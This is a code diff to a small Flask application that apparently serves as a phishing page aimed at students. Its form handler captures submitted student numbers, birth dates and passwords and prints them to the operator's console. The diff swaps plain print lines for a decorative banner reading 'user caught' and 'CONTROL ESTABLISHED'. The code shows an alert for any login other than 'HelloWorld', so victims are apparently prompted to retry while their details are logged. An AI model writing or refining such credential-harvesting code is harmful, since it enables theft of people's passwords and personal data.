@@ -14,14 +14,26 @@ def home():
         year = request.form.get('SelectYear')
         password = request.form.get('password')
 
-        print("________________________________")
-        print("USER CAUGHTTTT!! HAHHAHAHA")
-        print("________________________________")
-        print(f"Student Number: {studno}", flush=True)
-        print(f"Birth Date: {month}-{day}-{year}", flush=True)
-        print(f"Password: {password}", flush=True)
-        print("________________________________")
-        print()
+                print(f"""
+\033[1;31m╔════════════════════════════════════════════════╗
+║ ██████╗ ██████╗ ██████╗ ██╗     ██╗███╗   ██╗ ║
+║ ██╔══██╗╚════██╗██╔══██╗██║     ██║████╗  ██║ ║
+║ ██████╔╝ █████╔╝██████╔╝██║     ██║██╔██╗ ██║ ║
+║ ██╔══██╗ ╚═══██╗██╔══██╗██║     ██║██║╚██╗██║ ║
+║ ██████╔╝██████╔╝██║  ██║███████╗██║██║ ╚████║ ║
+║ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ║
+╠════════════════════════════════════════════════╣
+║              🚨  user caught  🚨              ║
+╠════════════════════════════════════════════════╣
+\033[1;32m║ 🆔 STUDENT ID   : {studno}
+║ 🎂 BIRTH DATE   : {month}-{day}-{year}
+║ 🔑 PASSWORD     : {password}
+\033[1;31m╠════════════════════════════════════════════════╣
+║        STATUS : ACCESS DENIED ❌               ║
+║        RESULT : CONTROL ESTABLISHED ☠          ║
+╚════════════════════════════════════════════════╝
+\033[0m
+""")
 
         if studno != "HelloWorld" and password != "HelloWorld":
             show_alert = True
@@ -32,3 +44,4 @@ def home():
 
 if __name__ == '__main__':
     app.run(debug=True, use_reloader=False)
+
